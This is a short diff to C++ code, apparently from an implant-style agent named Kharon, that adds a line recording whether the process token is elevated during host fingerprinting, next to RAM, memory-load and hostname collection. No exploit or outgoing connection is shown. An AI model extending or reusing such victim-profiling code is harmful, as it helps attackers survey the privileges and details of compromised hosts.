@@ -281,6 +281,8 @@ auto DECLFN Kharon::Init(
     this->Machine.UsedRAM    = ( ( MemInfoEx.ullTotalPhys / ( 1024*1024 ) ) - ( MemInfoEx.ullAvailPhys / ( 1024*1024 ) ) );;
     this->Machine.PercentRAM = MemInfoEx.dwMemoryLoad;
 
+    this->Session.Elevated = Elevation.TokenIsElevated;
+
     Success = this->Krnl32.GetComputerNameExA( ComputerNameDnsHostname, NULL, &TmpVal );
     if ( !Success ) {
         this->Machine.CompName = (PCHAR)this->Hp->Alloc( TmpVal );
